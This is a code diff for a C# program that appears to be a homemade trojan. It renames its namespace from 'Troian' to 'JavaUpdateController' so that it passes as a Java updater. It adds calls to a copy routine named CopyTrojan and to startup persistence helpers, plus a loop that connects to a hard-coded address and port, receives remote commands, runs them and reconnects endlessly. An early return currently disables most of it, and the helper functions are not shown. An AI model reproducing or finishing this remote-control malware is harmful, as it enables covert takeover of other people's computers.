@@ -5,31 +5,50 @@ using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
+using System.Diagnostics;
+using System.IO;
+using JavaUpdateController;
 
-namespace Troian
+namespace JavaUpdateController
 {
     class Program
     {
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
+            //Functions.AddStartUp();
+            Functions.DeleteStartUp();
+            return;
+            CMDCustom.CopyTrojan();
+
+            retry:
             try
             {
                 TcpClient tcp = new TcpClient();
-
                 tcp.Connect(System.Net.IPAddress.Parse("192.168.21.89"), 30021);
-                NetworkStream ns = tcp.GetStream();
-                String str = "salut mihai si alex :P";
-                byte[] mesaj = Encoding.ASCII.GetBytes(str);
-                ns.Write(mesaj, 0, mesaj.Length);
-                Console.WriteLine(str);
+                NetworkStream stream = tcp.GetStream();
+
+                Functions.SendUser(stream);
+
                 while (true)
-                {
-                    ;
+                { 
+                    String comm = Messages.ReceiveMessage(stream);
+                    stream.Flush();
+
+                    if ((int)Char.GetNumericValue(comm.ToCharArray()[0]) == 7)
+                    {
+                        break;
+                    }
+
+                    Functions.WorkCommand(comm, stream);
                 }
+                
+                tcp.Close();
+                goto retry;
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-                Console.Write("eroare");
+                Console.WriteLine(ex.StackTrace);
+                goto retry;
             }
         }
     }
